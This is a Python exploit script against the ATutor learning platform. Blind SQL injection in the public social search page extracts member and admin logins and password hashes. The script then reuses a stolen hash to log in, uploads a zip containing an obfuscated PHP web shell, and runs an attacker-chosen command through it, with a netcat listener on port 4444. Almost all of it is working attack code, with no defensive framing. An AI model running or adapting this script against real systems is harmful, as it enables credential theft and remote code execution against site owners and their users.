import hashlib
import os
import requests
import sys
import time
import zipfile
from io import BytesIO
from multiprocessing import Process

def listen_connection():
    print('(+) Listening for connection....')
    os.system('nc -nlvp 4444')

def _build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('poc3/poc3.php4', '<?php phpinfo(); ?>')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.write('obfuscated-phpshell.php4')
    z.close()
    zip = open('poc3.zip','wb')
    zip.write(f.getvalue())
    zip.close()

def we_can_login_with_a_hash(ip, password_hash, username, cmd):
    target = "http://%s/ATutor/login.php" % ip
    token = "hax"
    hashed = hashlib.sha1((password_hash + token).encode()).hexdigest()
    d = {
            "form_password_hidden" : hashed,
            "form_login": username,
            "submit": "Login",
            "token" : token
    }
    s = requests.Session()
    r = s.post(target, data = d)
    res = r.text
    
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res or "Home: Administration" in res:
        _build_zip()
        url = "http://%s/ATutor/mods/_standard/tests/import_test.php" % ip
        files = {'file': ('poc3.zip', open('poc3.zip', 'rb'), 'application/zip', {'Expires': '0'})}
        r = s.post(url, files=files)

        url = "http://%s/ATutor/content/import/1/obfuscated-phpshell.php4" % ip
        d = {
                "password" : "lol",
                "cmd" : cmd
        }
        r = s.post(url, data=d)
        print(r.text)
        return True
    return False

def searchFriends_sqli(ip, cmd):
    print("(+) Retrieving database version length....")

    for i in range(100):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/LENGTH(VERSION()))={}%23".format(ip, i)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])

        if content_length > 20:
            version_length = i
            print(version_length)

    print("(+) Retrieving database version....")

    for i in range(1, version_length + 1):
        injection_string = "AAAA')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/VERSION()),{},1)))=[REPLACEMENT]%23".format(i)
        for j in range(32, 127):
            target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[REPLACEMENT]", str(j)))
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])
            
            if content_length > 20:
                extracted_char = chr(j)
                sys.stdout.write(extracted_char)
                sys.stdout.flush()

    print()
    print("(+) Retrieving username length....")

    for i in range(100):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/LENGTH(login)/**/FROM/**/AT_members/**/LIMIT/**/1)={}%23".format(ip, i)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])

        if content_length > 20:
            username_length = i
            print(username_length)

    print("(+) Retrieving username....")
    username = ""

    for i in range(1, username_length + 1):
        injection_string = "AAAA')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/login/**/FROM/**/AT_members/**/LIMIT/**/1),{},1)))=[REPLACEMENT]%23".format(i)
        for j in range(32, 127):
            target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[REPLACEMENT]", str(j)))
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])
            
            if content_length > 20:
                extracted_char = chr(j)
                username += extracted_char
                sys.stdout.write(extracted_char)
                sys.stdout.flush()

    print()
    print("(+) Retrieving password hash length....")

    for i in range(100):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/LENGTH(password)/**/FROM/**/AT_members/**/WHERE/**/login/**/='{}')={}%23".format(ip, username, i)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])

        if content_length > 20:
            password_hash_length = i
            print(password_hash_length)

    print("(+) Retrieving password hash....")
    password_hash = ""

    for i in range(1, password_hash_length + 1):
        injection_string = "AAAA')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/AT_members/**/WHERE/**/login/**/='{}'),{},1)))=[REPLACEMENT]%23".format(username, i)
        for j in range(32, 127):
            target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[REPLACEMENT]", str(j)))
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])
 
            if content_length > 20:
                extracted_char = chr(j)
                password_hash += extracted_char
                sys.stdout.write(extracted_char)
                sys.stdout.flush()

    print()
    print("(+) Retrieving admin username length....")

    for i in range(100):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/LENGTH(login)/**/FROM/**/AT_admins/**/LIMIT/**/1)={}%23".format(ip, i)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])

        if content_length > 20:
            username_length = i
            print(username_length)

    print("(+) Retrieving admin username....")
    admin_username = ""

    for i in range(1, username_length + 1):
        injection_string = "AAAA')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/login/**/FROM/**/AT_admins/**/LIMIT/**/1),{},1)))=[REPLACEMENT]%23".format(i)
        for j in range(32, 127):
            target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[REPLACEMENT]", str(j)))
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])

            if content_length > 20:
                extracted_char = chr(j)
                admin_username += extracted_char
                sys.stdout.write(extracted_char)
                sys.stdout.flush()

    print()
    print("(+) Retrieving admin password hash length....")

    for i in range(100):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/LENGTH(password)/**/FROM/**/AT_admins/**/WHERE/**/login/**/='{}')={}%23".format(ip, admin_username, i)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])

        if content_length > 20:
            password_hash_length = i
            print(password_hash_length)

    print("(+) Retrieving admin password hash....")
    admin_password_hash = ""

    for i in range(1, password_hash_length + 1):
        injection_string = "AAAA')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/AT_admins/**/WHERE/**/login/**/='{}'),{},1)))=[REPLACEMENT]%23".format(admin_username, i)
        for j in range(32, 127):
            target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[REPLACEMENT]", str(j)))
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])

            if content_length > 20:
                extracted_char = chr(j)
                admin_password_hash += extracted_char
                sys.stdout.write(extracted_char)
                sys.stdout.flush()

    print()
    print("(+) Checking if the database user has SUPER privilege....")
    target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/Super_priv/**/FROM/**/mysql.user/**/WHERE/**/user/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',1))/**/AND/**/Host/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',-1)))='Y';%23".format(ip, i)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])

    if content_length > 20:
        print("Yes")
    else:
        print("No")

    print("(+) Spawning a shell....") 
    if not we_can_login_with_a_hash(ip, password_hash, username, cmd):
        print("(+) Hitting the fan with shit....")

def main():
    if len(sys.argv) != 3:
        print("(+) usage: %s <target> <cmd>" % sys.argv[0])
        print("(+) eg: %s 192.168.121.103 whoami" % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    cmd = sys.argv[2]
    p1 = Process(target=listen_connection)
    p1.start()
    time.sleep(5)
    p2 = Process(target=searchFriends_sqli(ip, cmd))
    p2.start()
    p1.join()
    p2.join()
    print("(+) done!")

if __name__ == "__main__":
    main()
